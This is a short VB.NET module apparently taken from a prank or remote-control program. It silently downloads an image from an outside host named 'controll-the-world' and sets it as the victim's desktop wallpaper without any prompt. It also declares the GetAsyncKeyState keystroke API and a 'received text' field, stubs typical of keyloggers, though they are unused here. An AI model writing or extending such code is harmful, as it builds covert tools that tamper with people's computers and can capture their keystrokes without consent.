Imports System.Net

Module Background
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Ansi Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Integer
    Private erhaltenerText As RichTextBox

    Private path1 As String

    Private path2 As String

    Private userDir As Object
#Region "Background"
    Sub Main()



        Dim Location As String
        Dim Client As New WebClient
        Client.DownloadFile("http://controll-the-world.comli.com/image.jpg", My.Computer.FileSystem.SpecialDirectories.Temp & "image.jpg")
        Client.Dispose()

        Location = (My.Computer.FileSystem.SpecialDirectories.Temp & "image.jpg")

        SystemParametersInfo(SETDESKWALLPAPER, 0, Location, UPDATEINIFILE)


    End Sub
#End Region
End Module
